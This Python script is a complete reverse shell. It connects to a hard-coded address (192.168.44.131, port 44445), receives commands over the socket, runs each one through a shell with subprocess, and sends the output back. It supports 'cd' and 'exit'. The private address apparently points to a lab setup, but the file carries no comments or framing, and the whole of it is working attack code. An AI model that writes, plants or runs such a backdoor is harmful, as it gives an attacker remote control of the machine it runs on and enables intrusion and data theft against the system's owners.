import socket, os, subprocess

SRV_ADDR = "192.168.44.131"
SRV_PORT = 44445

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SRV_ADDR, SRV_PORT))
while 1:
    path = os.getcwd() + "$ "
    s.sendall(path.encode())
    data = s.recv(1024)
    if not data: break
    command = data.decode('utf-8').strip()
    if command == 'exit':
        break
    elif command[:3] == 'cd ':
        os.chdir(command[3:])
    else:
        execute = subprocess.Popen(command, 
                                   shell=True, 
                                   stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read() + "\n".encode()
        s.sendall(result)
s.close()